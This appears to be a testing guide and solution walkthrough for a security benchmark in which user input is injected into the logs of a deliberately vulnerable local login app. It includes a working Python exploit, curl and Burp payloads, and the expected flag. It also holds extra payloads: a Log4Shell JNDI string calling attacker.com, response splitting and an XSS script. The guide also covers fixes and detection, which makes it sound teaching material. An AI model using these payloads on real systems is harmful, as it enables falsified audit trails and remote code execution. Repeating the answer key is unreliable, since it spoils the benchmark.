# S7BEN-EASY-006: Manual Testing Guide

## Vulnerability: Log Injection - Forge Log Entries

### Overview
This benchmark demonstrates log injection (also known as CRLF injection in logs) where unsanitized user input is written to log files. Attackers can inject newline characters to create fake log entries, hide malicious activity, or bypass log-based security monitoring.

---

## Setup

### 1. Build and Start the Benchmark
```bash
cd benchmarks/S7BEN-EASY-006
make build
make up
```

### 2. Verify Service is Running
```bash
make test
# Should output: Health check passed
```

### 3. Access the Application
Open your browser to: http://localhost:5000

---

## Understanding the Vulnerability

### What is Log Injection?

Log injection occurs when user-controlled data is written to log files without proper sanitization. Attackers can inject:
- **Newline characters** (`\n`, `\r\n`) to create fake log entries
- **False timestamps** to manipulate timelines
- **Fake success messages** to hide failures
- **Malicious payloads** to exploit log viewers

### Impact:
- Bypass SIEM and log monitoring systems
- Create false audit trails
- Hide malicious activity
- Inject false alerts to create noise
- Exploit log parsing tools

---

## Manual Testing Steps

### Step 1: Normal Login Attempt
```bash
curl -X POST http://localhost:5000/login \
  -d "username=testuser&password=wrongpass"
```

### Step 2: View Logs
```bash
curl http://localhost:5000/logs
```

You'll see a normal log entry:
```
[2026-01-07T12:00:00] Login attempt - Username: testuser, IP: 172.17.0.1
[2026-01-07T12:00:00] Login failed - Invalid credentials for username: testuser
```

### Step 3: Test with Special Characters
Try injecting a newline in the username (this won't work with curl form data encoding):
```bash
# URL-encoded newline (%0A)
curl -X POST http://localhost:5000/login \
  --data-urlencode "username=test%0Afakeline" \
  --data-urlencode "password=test"
```

Check the logs again - you might see the injection!

---

## Exploitation

### Method 1: Using curl with URL Encoding

The key is to inject `\n` (newline) to create a fake log entry.

```bash
# Create a username that injects a fake admin login
# URL encoding: %0A = newline, %20 = space

PAYLOAD="attacker%0ALogin%20successful%20-%20Username:%20admin,%20IP:%20127.0.0.1"

curl -X POST "http://localhost:5000/login" \
  --data-urlencode "username=${PAYLOAD}" \
  --data-urlencode "password=anything"
```

However, `--data-urlencode` will escape our payload. Let's use a different approach:

```bash
# Direct POST with raw form data
curl -X POST "http://localhost:5000/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary "username=attacker%0ALogin%20successful%20-%20Username:%20admin,%20IP:%20127.0.0.1&password=test"
```

### Method 2: Using Python (Recommended)

Create `exploit.py`:
```python
import requests
import urllib.parse

URL = "http://localhost:5000"

def inject_log():
    """Inject a forged admin login entry"""

    print("[*] Attempting log injection...")

    # Craft the malicious username with newline injection
    # This will create a fake log entry showing admin login from localhost
    malicious_username = "attacker\nLogin successful - Username: admin, IP: 127.0.0.1"

    print(f"[*] Injecting username: {repr(malicious_username)}")

    # Send the login request with injected username
    response = requests.post(
        f"{URL}/login",
        data={
            "username": malicious_username,
            "password": "anything"
        }
    )

    print(f"[+] Login request sent (Status: {response.status_code})")

    # View the logs to see the injection
    print("\n[*] Fetching logs...")
    logs_response = requests.get(f"{URL}/logs")

    if logs_response.status_code == 200:
        print("[+] Logs retrieved successfully")
        print("\n" + "="*60)
        print("LOG CONTENTS:")
        print("="*60)

        # Extract log content from HTML
        if '<pre>' in logs_response.text:
            start = logs_response.text.find('<pre>') + 5
            end = logs_response.text.find('</pre>')
            logs = logs_response.text[start:end]
            print(logs)
        else:
            print(logs_response.text)

        print("="*60)

    # Verify the injection
    print("\n[*] Verifying injection...")
    verify_response = requests.get(f"{URL}/verify")

    if verify_response.status_code == 200:
        if 'FLAG:' in verify_response.text or 'S7BEN{' in verify_response.text:
            # Extract flag
            if 'S7BEN{' in verify_response.text:
                start = verify_response.text.find('S7BEN{')
                end = verify_response.text.find('}', start) + 1
                flag = verify_response.text[start:end]

                print("\n" + "="*60)
                print("SUCCESS! LOG INJECTION VERIFIED!")
                print("="*60)
                print(f"\nFLAG: {flag}\n")
                print("="*60)
                return True
        else:
            print("\n[-] Injection not detected by verification endpoint")
            print("[!] Check logs manually to see if injection worked")

    return False

if __name__ == "__main__":
    print("="*60)
    print("S7BEN-EASY-006: Log Injection Exploit")
    print("="*60)
    inject_log()
```

Run the exploit:
```bash
python3 exploit.py
```

**Expected Output:**
```
============================================================
S7BEN-EASY-006: Log Injection Exploit
============================================================
[*] Attempting log injection...
[*] Injecting username: 'attacker\nLogin successful - Username: admin, IP: 127.0.0.1'
[+] Login request sent (Status: 200)

[*] Fetching logs...
[+] Logs retrieved successfully

============================================================
LOG CONTENTS:
============================================================
[2026-01-07T12:00:00] Application started
[2026-01-07T12:00:00] Log file initialized
[2026-01-07T12:05:30] Login attempt - Username: attacker
Login successful - Username: admin, IP: 127.0.0.1, IP: 172.17.0.1
[2026-01-07T12:05:30] Login failed - Invalid credentials for username: attacker
Login successful - Username: admin, IP: 127.0.0.1
============================================================

[*] Verifying injection...

============================================================
SUCCESS! LOG INJECTION VERIFIED!
============================================================

FLAG: S7BEN{L0G_1NJ3CT10N_MAST3R}

============================================================
```

### Method 3: Using Browser (Manual)

1. Open http://localhost:5000
2. In the username field, enter:
   ```
   attacker
   Login successful - Username: admin, IP: 127.0.0.1
   ```
   (Press Shift+Enter to create actual newline in the field)

3. Enter any password
4. Click "Login"
5. Click "View Logs" to see your injection
6. Click "Verify Injection" to get the flag

### Method 4: Using Burp Suite

1. Intercept the login request
2. Modify the username parameter:
   ```
   username=attacker%0ALogin+successful+-+Username:+admin,+IP:+127.0.0.1&password=test
   ```
3. Forward the request
4. Navigate to `/verify` to check if injection succeeded

---

## Verifying the Injection

### Check Logs Manually:
```bash
curl http://localhost:5000/logs
```

Look for your injected line. It should appear as a separate log entry without a timestamp prefix.

### Get the Flag:
```bash
curl http://localhost:5000/verify
```

If successful, you'll receive the flag!

---

## Understanding the Vulnerable Code

### The Vulnerability (app.py:72-75)

```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    # ...

    # VULNERABILITY: Username logged without sanitization!
    log_message(f"Login attempt - Username: {username}, IP: {ip}")
```

### What Happens:

1. User submits username: `attacker\nLogin successful - Username: admin, IP: 127.0.0.1`
2. Application writes to log:
   ```
   [timestamp] Login attempt - Username: attacker
   Login successful - Username: admin, IP: 127.0.0.1, IP: 172.17.0.1
   ```
3. Log parser sees TWO entries:
   - Failed login from attacker
   - **Successful admin login from localhost** (fake!)

---

## Real-World Examples

### Example 1: Hiding Brute Force Attacks
```python
# Inject hundreds of "successful" logins to hide your failed attempts
username = "attacker\n" + "\n".join([
    f"Login successful - Username: admin{i}, IP: 10.0.0.{i}"
    for i in range(1, 100)
])
```

### Example 2: Log Poisoning for XSS
```python
# If logs are viewed in a web interface without escaping
username = "attacker\n<script>alert('XSS')</script>"
```

### Example 3: Bypassing Rate Limiting
```python
# Inject fake successful logins to reset rate limit counters
username = "attacker\nRate limit reset for IP: 172.17.0.1"
```

---

## Proper Fix

### Sanitize Log Input:

```python
import re

def sanitize_log_input(text):
    """Remove newlines and control characters from log input"""
    # Remove newlines, carriage returns, and other control chars
    return re.sub(r'[\r\n\t\x00-\x1f\x7f]', '', text)

def log_message(message):
    """Write sanitized message to log"""
    timestamp = datetime.now().isoformat()
    sanitized = sanitize_log_input(message)
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{timestamp}] {sanitized}\n")
```

### Or Use Structured Logging:

```python
import json
import logging

# Use structured logging (JSON format)
logging.basicConfig(
    format='%(message)s',
    handlers=[logging.FileHandler('/tmp/app.log')]
)

def log_login_attempt(username, ip, success):
    log_entry = json.dumps({
        'timestamp': datetime.now().isoformat(),
        'event': 'login_attempt',
        'username': username,  # JSON encoding prevents injection
        'ip': ip,
        'success': success
    })
    logging.info(log_entry)
```

---

## Advanced Exploitation Techniques

### Multi-line Injection:
```python
username = "attacker\n" + \
           "[2026-01-07T11:59:59] Login successful - Username: admin, IP: 127.0.0.1\n" + \
           "[2026-01-07T11:59:59] Admin accessed sensitive data\n" + \
           "[2026-01-07T12:00:00] Audit log check: PASSED"
```

### CRLF Injection for HTTP Response Splitting:
```python
# If logs are served via HTTP headers
username = "attacker\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n..."
```

### Log4Shell Style Injection:
```python
# If application uses vulnerable logging library
username = "${jndi:ldap://attacker.com/exploit}"
```

---

## Detection and Prevention

### Detection:
- Monitor for newline characters in logged fields
- Alert on log entries without timestamps
- Check for duplicate/similar log patterns
- Use log integrity checking

### Prevention:
1. **Sanitize all user input before logging**
2. **Use structured logging (JSON)**
3. **Validate log format in SIEM**
4. **Implement log signing/integrity checks**
5. **Separate fields in logs** (don't concatenate strings)

---

## Troubleshooting

### Issue: Newline not creating separate log entry
**Solution:** Make sure you're using actual newline characters (`\n`), not the string `"\\n"`. In Python, use:
```python
username = "test\nfake line"  # Correct
# NOT: "test\\nfake line"
```

### Issue: Injection works but flag not appearing
**Solution:** Make sure your injected text matches the expected format:
```
Login successful - Username: admin, IP: 127.0.0.1
```

### Issue: Can't see logs
```bash
# Check if service is running
docker compose ps

# Check logs
docker compose logs app

# Access logs directly from container
docker compose exec app cat /tmp/app.log
```

---

## Cleanup

```bash
make down
make clean
```

---

## Success Criteria

- Successfully injected newline character in username field
- Created forged log entry showing admin login from 127.0.0.1
- Verification endpoint confirmed injection
- Retrieved flag: `S7BEN{L0G_1NJ3CT10N_MAST3R}`
